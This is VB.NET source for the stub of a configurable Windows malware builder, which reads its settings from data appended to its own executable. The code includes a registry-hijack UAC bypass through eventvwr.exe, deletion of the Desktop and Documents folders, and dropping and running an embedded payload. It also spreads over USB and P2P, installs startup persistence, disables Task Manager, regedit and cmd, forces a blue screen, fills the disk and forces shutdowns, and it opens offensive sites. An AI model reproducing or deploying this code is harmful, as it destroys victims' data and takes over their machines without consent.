Imports Microsoft.Win32
Imports System.IO
Imports System.ComponentModel
Imports System.Runtime.InteropServices

Public Class Form1
    Const FileSplit = "@SDJMVMPVsdq54v@"
    Dim op(), msg_tlt, msg_bdy, msg_stl, usb, p2p, yahoo, D_clip, D_taskmg, d_cmd, d_regedit, d_explo, d_uac, msg _
        , set_clip, clip_text, prtc_prc, dlt_alldtpfil, dlt_allmydoc, encmy_dmnt, encmydmn_key, meltfile, lunche_dely, dely_time, reg_start_up, Folder_startup _
        , ext, file2 As String

    Dim cpu_full, spam_desksukl, opnnclo_cddriv, hid_taskbar, D_webbro, makeC_full, D_Custom, D_selectedpro _
        , D_proc, D_selectdProc, D_Keybaord, Crzy_Mouse, Blue_screan, Close_all, chang_Datentime, S_date, S_time _
        , Playbeep, Black_screan, Destroy_mine, delet_webbrowser, Turn_off, restart_pc, log_off, look_mouse _
         , open_FBI, open_gay, open_zoo, custo_site, sel_custo_site, set_kbrd, valu_kbrd, flashy_scrn _
         , spm_msg, themsg As String




    Dim TPath As String = System.IO.Path.GetTempPath
    Sub getinfo()
        Try
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        msg_tlt = Space(LOF(1))
        msg_bdy = Space(LOF(1))
        FileGet(1, msg_tlt)
        FileGet(1, msg_bdy)
        FileClose(1)
        op = Split(msg_tlt, FileSplit)

        msg_tlt = op(1)
        msg_bdy = op(2)
        msg_stl = op(3)
        usb = op(4)
        p2p = op(5)
        yahoo = op(6)

        msg = op(13)

        prtc_prc = op(16)

        meltfile = op(22)
        lunche_dely = op(23)
        dely_time = op(24)
        reg_start_up = op(25)
        Folder_startup = op(26)
        ext = op(27)
        file2 = op(28)

        'Viruses
        D_clip = op(7)  ' done
        D_taskmg = op(8) ' done
        d_cmd = op(9)  ' done
        d_regedit = op(10)  ' done
        d_explo = op(11) ' done
        d_uac = op(12)
        dlt_alldtpfil = op(17) ' done
        dlt_allmydoc = op(18) ' done
        encmy_dmnt = op(19)
        encmydmn_key = op(20)
        set_clip = op(14)  ' done
        clip_text = op(15)  ' done
        cpu_full = op(29)
        spam_desksukl = op(30) ' done
        opnnclo_cddriv = op(31)  ' done
        hid_taskbar = op(32) ' done
            D_webbro = op(33)  'done
            makeC_full = op(34) ' Done
            D_Custom = op(35) ' Done
            D_selectedpro = op(36) ' Done
            D_proc = op(37) ' Done
            D_selectdProc = op(38) ' Done
            D_Keybaord = op(39) ' Done not tested
            Crzy_Mouse = op(40)
            Blue_screan = op(41) ' Done
            Close_all = op(42)
            chang_Datentime = op(43) ' Done
            S_date = op(44) ' Done
            S_time = op(45) ' Done
            Playbeep = op(46)  ' Done
            Black_screan = op(47) ' Done
            Destroy_mine = op(48)
            delet_webbrowser = op(49)
            Turn_off = op(50) ' Done
            restart_pc = op(51) ' Done
            log_off = op(52) ' Done
            look_mouse = op(53)
            open_FBI = op(54)  ' Done
            open_gay = op(55)  ' Done
            open_zoo = op(56)
            sel_custo_site = op(57) ' Done
            custo_site = op(58) ' Done
            set_kbrd = op(59) ' Done
            valu_kbrd = op(60) ' Done
            flashy_scrn = op(61)
            spm_msg = op(62)
            themsg = op(63)
            'last count here look up

        Catch ex As Exception

        End Try
    End Sub
   


    Sub set_options()
        On Error Resume Next

        If lunche_dely = "True" Then
            Threading.Thread.Sleep(dely_time)
        End If
        If prtc_prc = "True" Then
            Protect.pr(1)
        End If

        If msg = "True" Then

            If msg_stl = "err" Then
                MsgBox(msg_bdy, MsgBoxStyle.Critical, msg_tlt)
            End If
            If msg_stl = "exx" Then
                MsgBox(msg_bdy, MsgBoxStyle.Exclamation, msg_tlt)
            End If
            If msg_stl = "info" Then
                MsgBox(msg_bdy, MsgBoxStyle.Information, msg_tlt)
            End If
            If msg_stl = "quest" Then
                MsgBox(msg_bdy, MsgBoxStyle.MsgBoxHelp, msg_tlt)
            End If

        End If
        If file2 = Nothing Or ext = Nothing Then
        Else
            Dim randoname As String = TPath & "\" & RandomString(4, False, True, True, False, False, True) & ext

            FileOpen(1, randoname, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, file2)
            FileClose(1)
            System.Diagnostics.Process.Start(randoname)
        End If


        If meltfile = "True" Then
            Dim s As New FileInfo(Application.ExecutablePath)
            s.Attributes = FileAttributes.Hidden
            s.Refresh()
        End If

        If p2p = "True" Then
            P22P.p2p()
        End If
        If usb = "True" Then
            usbSpreedgo()
        End If
        If reg_start_up = "True" Then
            RegStartup(Application.ExecutablePath)
        End If
        If Folder_startup = "True" Then
            FoldStartup(Application.ExecutablePath)
        End If


    End Sub
    Dim trd1 As Threading.Thread
    Public Sub Bypass_UAC(ByVal filepath As String)
        Using regkey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command")
            regkey.SetValue("", filepath, RegistryValueKind.String)
        End Using
        Process.Start("eventvwr.exe")
    End Sub
    Sub execute()
        On Error Resume Next
      
        If flashy_scrn = "True" Then
            Wendy.Show()
        End If
        If open_FBI = "True" Then
            Process.Start("www.fbi.gov")
        End If
        If open_gay = "True" Then
            Process.Start("www.gaymaletube.com")
        End If
        If open_zoo = "True" Then

        End If

        If Black_screan = "True" Then
            Black_negga.Show()
        End If
        If custo_site = "True" Then
            Process.Start(sel_custo_site)
        End If
        If D_Keybaord = "True" Then
            Dim pathfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".bat"
            My.Computer.FileSystem.WriteAllText(pathfile, My.Resources.D_Keybaord, True)
            Bypass_UAC(pathfile)
        End If

        If chang_Datentime = "True" Then
            Dim pathfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".bat"
            Dim s As New StreamWriter(pathfile)
            s.WriteLine("time " & S_time)
            s.WriteLine("date " & S_date)
            s.Close()
            Bypass_UAC(pathfile)
        End If


        Dltdsktp(dlt_alldtpfil)
        DltMydocu(dlt_allmydoc)
        If hid_taskbar = "True" Then
            task_barhide.Start()
        End If
        If D_proc = "True" Then
            D_Custo_Proc(D_selectdProc)
        End If

        If makeC_full = "True" Then
            trd1 = New Threading.Thread(AddressOf pump)
            trd1.IsBackground = True
            trd1.Start()
        End If





        If Blue_screan = "True" Then
            Protect.pr(1)
            End
        End If
        If Turn_off = "True" Then
            Dim pathfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".bat"
            Dim wrtr As New StreamWriter(pathfile)
            wrtr.WriteLine("Shutdown -s -t 50")
            wrtr.Close()
            Bypass_UAC(pathfile)
        End If
        If restart_pc = "True" Then
            Dim pathfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".bat"
            Dim wrtr As New StreamWriter(pathfile)
            wrtr.WriteLine("Shutdown -r -t 50")
            wrtr.Close()
            Bypass_UAC(pathfile)
        End If
        If log_off = "True" Then
            Dim pathfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".bat"
            Dim wrtr As New StreamWriter(pathfile)
            wrtr.WriteLine("Shutdown -l -t 50")
            wrtr.Close()
            Bypass_UAC(pathfile)
        End If

    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
       

        '   Me.ShowInTaskbar = False
        ' Me.ControlBox = False
        ' Me.Opacity = 0
        '  Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None

        getinfo()
        set_options()
        execute()
    End Sub


    Private Sub Rep_Tick(sender As Object, e As EventArgs) Handles Rep.Tick

        Try
            If spm_msg = "True" Then
                MsgBox (themsg ,MsgBoxStyle.Critical ,"")
            End If
            If set_kbrd = "True" Then
                My.Computer.Keyboard.SendKeys(valu_kbrd)
            End If
            If set_clip = "True" Then
                Clipboard.SetText(clip_text)
            End If

            If D_clip = "True" Then
                Clipboard.Clear()
            End If
            Dis_Webbrows(D_webbro)
            dis_taskmgr(D_taskmg)
            dis_cmd(d_cmd)
            dis_explo(d_explo)
            dis_reg(d_regedit)
            If D_Custom = "True" Then
                D_custo(D_selectedpro)
            End If
        Catch ex As Exception

        End Try
       
    End Sub

    Private Sub Spamer_Tick(sender As Object, e As EventArgs) Handles Spamer.Tick
        Try
            Spmskul(spam_desksukl)
        Catch ex As Exception
            Spamer.Stop()
        End Try

    End Sub

    Private Sub Rep2_Tick(sender As Object, e As EventArgs) Handles Rep2.Tick
        Try
            open_close_cddrive(opnnclo_cddriv)
            If Playbeep = "True" Then
                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
            End If
        Catch ex As Exception
            Rep2.Stop()
        End Try


    End Sub

#Region "Hid and show task bar "
    Private components1 As IContainer
    Private Const TASKBAR_HIDE As Integer = &H80
    Private Const TASKBAR_SHOW As Integer = &H40

    <DllImport("user32", EntryPoint:="FindWindowA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function FindWindow(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpClassName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpWindowName As String) As Integer
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function SetWindowPos(ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    End Function
    Public Sub CacherBarreTacheWindows()
        Dim lpClassName As String = "Shell_traywnd"
        Dim lpWindowName As String = ""
        Dim num As Long = Form1.FindWindow(lpClassName, lpWindowName)
        Form1.SetWindowPos(CInt(num), 0, 0, 0, 0, 0, &H80)
    End Sub

    Public Sub MontrerBarreTacheWindows()
        Dim lpClassName As String = "Shell_traywnd"
        Dim lpWindowName As String = ""
        Dim num As Long = Form1.FindWindow(lpClassName, lpWindowName)
        Form1.SetWindowPos(CInt(num), 0, 0, 0, 0, 0, &H40)
    End Sub
    Private Sub task_barshow_Tick(sender As Object, e As EventArgs) Handles task_barshow.Tick
        MontrerBarreTacheWindows()
        task_barshow.Stop()
        task_barhide.Start()
    End Sub

    Private Sub task_barhide_Tick(sender As Object, e As EventArgs) Handles task_barhide.Tick
        CacherBarreTacheWindows()
        task_barhide.Stop()
        task_barshow.Start()
    End Sub
#End Region
  
    
End Class
